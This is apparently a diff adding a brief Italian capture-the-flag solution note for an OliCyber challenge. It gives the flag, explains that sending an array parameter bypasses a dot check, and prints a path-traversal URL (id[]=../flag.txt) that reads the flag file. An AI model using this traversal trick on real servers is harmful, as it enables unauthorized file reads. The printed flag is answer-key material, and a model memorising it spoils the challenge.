@@ -1,0 +1,7 @@
+flag{N0n_fUng1bl3_p4th}
+
+
+se invio un vettore bypassa il controllo del punto quindi
+http://nft.challs.olicyber.it/nft?id[]=../flag.txt
+
+e nel codiice della pagina c'è un base64 che va messo su cyberchef
